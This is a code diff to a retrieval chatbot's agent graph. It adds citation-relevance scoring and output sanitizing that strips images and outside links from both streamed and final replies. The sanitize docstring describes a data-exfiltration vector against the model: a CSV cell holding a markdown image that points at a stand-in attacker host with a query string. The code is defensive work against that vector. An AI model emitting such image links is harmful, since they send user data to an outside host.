@@ -22,12 +22,19 @@ from typing import Any, Final, Literal
 
 from langgraph.runtime import Runtime
 
-from geekbot.agent.citations import check_citations
+from geekbot.agent.citations import check_citations, citing_sentences, is_refusal
 from geekbot.agent.condense import CondenseOutput, build_condense_messages, clean_standalone
 from geekbot.agent.mode import choose_mode
 from geekbot.agent.packing import pack_prompt
 from geekbot.agent.runtime import AgentContext
-from geekbot.agent.state import AgentState, HistoryMessage, SourceRef, StreamEvent
+from geekbot.agent.sanitize import StreamSanitizer, sanitize_text, source_urls
+from geekbot.agent.state import (
+    AgentState,
+    CitationScore,
+    HistoryMessage,
+    SourceRef,
+    StreamEvent,
+)
 from geekbot.domain import Label, ScoredChunk
 from geekbot.llm.chat import ChatError
 from geekbot.llm.streaming import read_stream
@@ -35,6 +42,7 @@ from geekbot.llm.streaming import read_stream
 __all__ = [
     "NO_CONTEXT_ANSWER",
     "begin_turn",
+    "cite_check",
     "condense",
     "csv_ask",
     "generate",
@@ -43,6 +51,7 @@ __all__ = [
     "no_context",
     "remember",
     "retrieve",
+    "sanitize",
     "section_trail",
     "source_refs",
     "validate_citations",
@@ -50,10 +59,13 @@ __all__ = [
 
 _ERROR_WIDTH: Final = 300  # how much of an error message is kept in the state
 
-# What the user is told when there is nothing to answer from. S3.5 replaces this stop-gap with a real
-# decision (grade the sources, abstain below a calibrated threshold); until then the one rule is that
-# a model is never asked to answer without sources, because a small model would answer from memory.
+# What the user is told when there is nothing to answer from. It starts the way a refusal does
+# (``is_refusal``), so a turn that found nothing counts as an abstention like one where the model
+# said it could not find the answer (D-082, option B: the model's own refusal, no score gate). The one
+# rule behind it is that a model is never asked to answer without sources, because a small model
+# would answer from memory.
 NO_CONTEXT_ANSWER: Final = "I could not find anything about that in the documents."
+_CHECKED_WIDTH: Final = 160  # how much of a checked sentence is kept in the state
 
 
 def _same_words(left: str, right: str) -> bool:
@@ -126,6 +138,10 @@ def begin_turn(state: AgentState) -> dict[str, Any]:
         "raw_answer": "",
         "cited": [],
         "dropped_citations": [],
+        "abstained": False,
+        "citation_checks": [],
+        "citation_check_error": "",
+        "removed_markup": [],
         "answer_labels": [],
         "thinking": "",
         "generation": {},
@@ -198,6 +214,7 @@ def no_context(state: AgentState) -> dict[str, Any]:
         "history_used": 0,
         "cited": [],
         "dropped_citations": [],
+        "abstained": True,
         "answer_labels": [],
         "generation": {},
     }
@@ -224,8 +241,9 @@ def generate(state: AgentState, runtime: Runtime[AgentContext]) -> dict[str, Any
     4. The node returns the answer, how many sources the prompt held (``used``), the labels of
        the prompt (they become the answer's, PLAN.md §8.2), the call's readings (``RunStats``,
        time to first token included) and, if the model reasoned, its reasoning. Nothing else
-       changes in the state. The answer is still the model's raw text: ``validate_citations`` runs
-       next, after the stream, on the finished text.
+       changes in the state. The answer is still the model's raw text: ``validate_citations``,
+       ``cite_check`` and ``sanitize`` run next, after the stream, on the finished text. The
+       *stream events* are already cleaned (``agent.sanitize``, S3.5), whatever those later steps do.
     """
     context = runtime.context
     packed = pack_prompt(
@@ -238,10 +256,17 @@ def generate(state: AgentState, runtime: Runtime[AgentContext]) -> dict[str, Any
     if packed.used == 0:
         return no_context(state)
     emit = runtime.stream_writer
+    # G3 (S3.5): what leaves this node as a stream event has been through the output cleaning, the
+    # reasoning as well as the answer. A piece that ends inside a possible image or link is held back
+    # until it is decided, so nothing the model wrote reaches a screen before it has been checked.
+    allowed = source_urls(source["text"] for source in state["sources"][: packed.used])
+    cleaners = {"text": StreamSanitizer(allowed), "thinking": StreamSanitizer(allowed)}
 
     def send(event: Literal["text", "thinking"]) -> Callable[[str], None]:
         def write(piece: str) -> None:
-            emit(StreamEvent(event=event, text=piece))
+            safe = cleaners[event].feed(piece)
+            if safe:
+                emit(StreamEvent(event=event, text=safe))
 
         return write
 
@@ -258,6 +283,10 @@ def generate(state: AgentState, runtime: Runtime[AgentContext]) -> dict[str, Any
     except Exception as error:
         detail = f"{type(error).__name__}: {error}"
         raise ChatError(f"the chat model {context.model!r} failed ({detail})") from error
+    for kind, cleaner in cleaners.items():
+        held = cleaner.finish()
+        if held:
+            emit(StreamEvent(event="text" if kind == "text" else "thinking", text=held))
     if not result.text:
         spent = (
             " (it spent its whole reply budget thinking; raise GEEKBOT_CHAT_THINK_NUM_PREDICT)"
@@ -294,6 +323,67 @@ def validate_citations(state: AgentState) -> dict[str, Any]:
         "raw_answer": raw,
         "cited": list(check.cited),
         "dropped_citations": list(check.dropped),
+        # D-082, option B: the model's own refusal is the abstention. A reply that starts like a
+        # refusal and cites a source is a partial answer, not an abstention.
+        "abstained": is_refusal(check.text) and not check.cited,
+    }
+
+
+def cite_check(state: AgentState, runtime: Runtime[AgentContext]) -> dict[str, Any]:
+    """Score every citation against the sentence that makes it (the relevance check of S3.5).
+
+    A valid ``[n]`` only means source ``n`` was in the prompt (``validate_citations``); it says
+    nothing about whether that source supports the claim. This step asks the cross-encoder (the same
+    model that reranks) how well each cited source's text fits the sentence that cites it, and marks
+    the ones below ``citation_weak_below`` as weak. It is a *relevance* check, not entailment, and
+    **it only reports**: the answer is never changed, and nothing is retried. It runs after the
+    stream, so it adds nothing to the time to first token. It is skipped, silently, when there is no
+    scorer (no reranker in this run) or nothing is cited; and it can never fail a turn: a scorer
+    that raises is recorded in ``citation_check_error`` and the answer stands.
+    """
+    context = runtime.context
+    scorer = context.citation_scorer
+    if scorer is None or not state.get("cited"):
+        return {"citation_checks": [], "citation_check_error": ""}
+    sources = state["sources"]
+    checks: list[CitationScore] = []
+    try:
+        for sentence, numbers in citing_sentences(state["answer"], state["used"]):
+            scores = scorer.score(sentence, [sources[n - 1]["text"] for n in numbers])
+            for n, score in zip(numbers, scores, strict=True):
+                checks.append(
+                    CitationScore(
+                        n=n,
+                        score=round(score, 3),
+                        weak=score < context.citation_weak_below,
+                        sentence=sentence[:_CHECKED_WIDTH],
+                    )
+                )
+    except Exception as error:  # noqa: BLE001  # a report must never stop an answer
+        detail = _one_line(f"{type(error).__name__}: {error}")
+        return {"citation_checks": [], "citation_check_error": detail}
+    return {"citation_checks": checks, "citation_check_error": ""}
+
+
+def sanitize(state: AgentState) -> dict[str, Any]:
+    """Clean the finished reply of images and outside links (G3, S3.5), on both branches.
+
+    The stream events were cleaned as they went (``generate``); this is the same cleaning of the
+    finished text, so the answer that is saved, returned and shown after the stream is exactly as
+    safe as what the stream showed. In CSV mode it is the only cleaning there is: a cell of the file
+    can hold ``![x](https://attacker.example/?q=...)`` and the package's reply repeats cells. The
+    addresses a link may keep are those in the sources the prompt held (none, in CSV mode). What
+    was removed is listed in ``removed_markup`` so the user can be told. A reply that is nothing but
+    removed markup is an error like any other empty reply, not a blank answer.
+    """
+    used = int(state.get("used", 0))
+    allowed = source_urls(source["text"] for source in state.get("sources", [])[:used])
+    result = sanitize_text(state["answer"], allowed)
+    if not result.text.strip():
+        raise ChatError("the reply held nothing but images or links that were removed")
+    return {
+        "answer": result.text.strip(),
+        "removed_markup": [f"{item.kind}: {item.target}" for item in result.removed],
     }
 
 
